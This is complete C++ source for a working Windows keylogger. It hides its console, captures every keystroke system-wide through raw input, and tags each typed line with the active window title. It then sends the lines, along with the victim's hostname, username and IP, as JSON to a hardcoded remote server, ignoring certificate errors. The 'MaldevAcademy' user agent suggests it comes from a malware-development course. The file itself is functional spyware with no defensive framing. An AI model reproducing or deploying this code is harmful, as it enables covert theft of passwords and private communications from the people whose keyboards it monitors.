#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wininet.h>
#include <hidusage.h>
#include <stdio.h>
#include <string>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "hid.lib")

#define KEYLOG_BUFFER_LEN 250
#define KEYLOG_CLASS_NAME L"KeylogClass"

#define SERVER_HOST "192.168.62.129"
#define SERVER_PORT 8888
#define SERVER_URI  "/"
#define USER_AGENT  "MaldevAcademy"

// shared buffers
static std::string titleHeader;
static std::string lineBuf;

// escape special characters for JSON string
std::string EscapeJsonString(const std::string& input) {
    std::ostringstream ss;
    for (unsigned char c : input) {
        switch (c) {
        case '\"': ss << "\\\""; break;
        case '\\': ss << "\\\\"; break;
        case '\b': ss << "\\b";  break;
        case '\f': ss << "\\f";  break;
        case '\n': ss << "\\n";  break;
        case '\r': ss << "\\r";  break;
        case '\t': ss << "\\t";  break;
        default:
            if (c <= 0x1F) {
                ss << "\\u"
                    << std::hex << std::setw(4) << std::setfill('0') << (int)c;
            }
            else {
                ss << c;
            }
        }
    }
    return ss.str();
}

// build JSON prefix
std::string GetSystemInfoPrefix() {
    CHAR host[256] = "(unknown)", user[256] = "(unknown)", ip[64] = "(unknown)";
    gethostname(host, sizeof(host));
    DWORD us = sizeof(user);
    GetUserNameA(user, &us);

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) == 0) {
        struct addrinfo hints = { 0 }, * res = nullptr;
        hints.ai_family = AF_INET;
        if (getaddrinfo(host, NULL, &hints, &res) == 0 && res) {
            sockaddr_in* sa = (sockaddr_in*)res->ai_addr;
            inet_ntop(AF_INET, &sa->sin_addr, ip, sizeof(ip));
            freeaddrinfo(res);
        }
        WSACleanup();
    }

    char buf[512];
    _snprintf_s(buf, sizeof(buf), _TRUNCATE,
        "{\"hostname\":\"%s\",\"username\":\"%s\",\"ip\":\"%s\",\"data\":",
        host, user, ip);
    return std::string(buf);
}

// send HTTP POST with JSON payload over HTTPS, ignore cert errors
void SendPayload(const std::string& payload) {
    //printf("[*] Sending: %s\n", payload.c_str());

    HINTERNET hNet = InternetOpenA(
        USER_AGENT,
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, NULL, 0
    );
    if (!hNet) {
        //printf("[!] InternetOpenA failed: %u\n", GetLastError());
        return;
    }

    HINTERNET hConn = InternetConnectA(
        hNet,
        SERVER_HOST,
        SERVER_PORT,
        NULL, NULL,
        INTERNET_SERVICE_HTTP,
        0, 0
    );
    if (!hConn) {
        //printf("[!] InternetConnectA failed: %u\n", GetLastError());
        InternetCloseHandle(hNet);
        return;
    }

    DWORD flags = INTERNET_FLAG_SECURE
        | INTERNET_FLAG_PRAGMA_NOCACHE
        | INTERNET_FLAG_KEEP_CONNECTION;

    HINTERNET hReq = HttpOpenRequestA(
        hConn,
        "POST",
        SERVER_URI,
        NULL, NULL, NULL,
        flags,
        0
    );
    if (!hReq) {
        //printf("[!] HttpOpenRequestA failed: %u\n", GetLastError());
        InternetCloseHandle(hConn);
        InternetCloseHandle(hNet);
        return;
    }

    // ignore all certificate errors
    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
        | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
        | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
        | SECURITY_FLAG_IGNORE_REVOCATION;
    InternetSetOptionA(hReq, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));

    char headers[128];
    _snprintf_s(headers, sizeof(headers), _TRUNCATE,
        "Content-Type: application/json; charset=utf-8\r\n"
        "Content-Length: %d\r\n",
        (int)payload.size()
    );

    BOOL ok = HttpSendRequestA(
        hReq,
        headers, -1,
        (LPVOID)payload.data(),
        (DWORD)payload.size()
    );
    if (!ok) {
        //printf("[!] HttpSendRequestA failed: %u\n", GetLastError());
    }

    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hNet);
}

// flush current line buffer as JSON
void FlushLine() {
    if (lineBuf.empty()) return;
    std::string raw = titleHeader + lineBuf;
    std::string escaped = EscapeJsonString(raw);
    std::string prefix = GetSystemInfoPrefix();
    std::string full = prefix + "\"" + escaped + "\"}";
    SendPayload(full);
    lineBuf.clear();
}

// update window title header
void UpdateTitle() {
    WCHAR wtxt[KEYLOG_BUFFER_LEN + 1] = {};
    DWORD pid = 0;
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return;
    GetWindowThreadProcessId(hwnd, &pid);
    GetWindowTextW(hwnd, wtxt, KEYLOG_BUFFER_LEN);

    int len = WideCharToMultiByte(CP_UTF8, 0, wtxt, -1, NULL, 0, NULL, NULL);
    std::string title(len, '\0');
    WideCharToMultiByte(CP_UTF8, 0, wtxt, -1, &title[0], len, NULL, NULL);

    std::string newHeader = "\n\n[" + std::to_string(pid) + "] " + title + "\n";
    if (newHeader != titleHeader) {
        FlushLine();
        titleHeader = newHeader;
    }
}

// process key event
void ProcessKey(UINT vk) {
    UpdateTitle();
    if (vk == VK_RETURN) {
        FlushLine();
        return;
    }
    if (vk == VK_BACK) {
        if (!lineBuf.empty()) lineBuf.pop_back();
        return;
    }
    BYTE kb[256] = {};
    WCHAR uni[2] = {};
    GetKeyboardState(kb);
    if (ToUnicode(vk, MapVirtualKeyW(vk, MAPVK_VK_TO_VSC), kb, uni, 1, 0) > 0) {
        int len = WideCharToMultiByte(CP_UTF8, 0, uni, 1, NULL, 0, NULL, NULL);
        std::string ch(len, '\0');
        WideCharToMultiByte(CP_UTF8, 0, uni, 1, &ch[0], len, NULL, NULL);
        lineBuf += ch;
    }
}

// raw input callback
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_INPUT) {
        UINT sz = 0;
        GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &sz, sizeof(RAWINPUTHEADER));
        BYTE* buf = new BYTE[sz];
        if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, buf, &sz, sizeof(RAWINPUTHEADER)) == sz) {
            PRAWINPUT raw = (PRAWINPUT)buf;
            if (raw->data.keyboard.Message == WM_KEYDOWN) {
                ProcessKey(raw->data.keyboard.VKey);
            }
        }
        delete[] buf;
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

//int wmain() {
//    UpdateTitle();
//    WNDCLASSEXW wc = { sizeof(WNDCLASSEXW), 0, WndProc, 0, 0,
//                       GetModuleHandleW(NULL), NULL, NULL, NULL, NULL,
//                       KEYLOG_CLASS_NAME, NULL };
//    RegisterClassExW(&wc);
//
//    HWND msgWnd = CreateWindowExW(0, KEYLOG_CLASS_NAME, NULL, 0,
//        0, 0, 0, 0, HWND_MESSAGE,
//        NULL, wc.hInstance, NULL);
//
//    RAWINPUTDEVICE rid = { HID_USAGE_PAGE_GENERIC, HID_USAGE_GENERIC_KEYBOARD,
//                           RIDEV_INPUTSINK, msgWnd };
//    RegisterRawInputDevices(&rid, 1, sizeof(rid));
//
//    MSG msg;
//    while (GetMessageW(&msg, NULL, 0, 0)) {
//        TranslateMessage(&msg);
//        DispatchMessageW(&msg);
//    }
//    return 0;
//}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    FreeConsole();
    UpdateTitle();
    WNDCLASSEXW wc = { sizeof(WNDCLASSEXW), 0, WndProc, 0, 0,
                       GetModuleHandleW(NULL), NULL, NULL, NULL, NULL,
                       KEYLOG_CLASS_NAME, NULL };
    RegisterClassExW(&wc);

    HWND msgWnd = CreateWindowExW(0, KEYLOG_CLASS_NAME, NULL, 0,
        0, 0, 0, 0, HWND_MESSAGE,
        NULL, wc.hInstance, NULL);

    RAWINPUTDEVICE rid = { HID_USAGE_PAGE_GENERIC, HID_USAGE_GENERIC_KEYBOARD,
                           RIDEV_INPUTSINK, msgWnd };
    RegisterRawInputDevices(&rid, 1, sizeof(rid));

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return 0;
}
